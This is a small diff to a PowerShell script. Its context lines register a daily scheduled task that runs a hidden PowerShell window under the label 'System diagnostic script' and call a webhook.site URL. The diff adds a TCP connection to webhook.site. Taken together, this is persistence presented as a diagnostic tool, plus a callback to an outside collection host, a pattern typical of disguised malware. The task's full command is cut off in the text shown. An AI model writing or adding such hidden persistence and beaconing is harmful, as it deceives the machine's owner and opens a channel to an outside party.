@@ -29,6 +29,7 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w h
 $trigger = New-ScheduledTaskTrigger -Daily -At 3am
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "System diagnostic script" -User $env:USERNAME -RunLevel Limited -Force | Out-Null
 
+$tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect("webhook.site",443); $tcp.Close()
 Invoke-WebRequest -Uri "https://webhook.site/3e2ec6ec-71f9-41a6-b24a-45b420aca63d" -UseBasicParsing
 
 Start-Sleep -Seconds 1
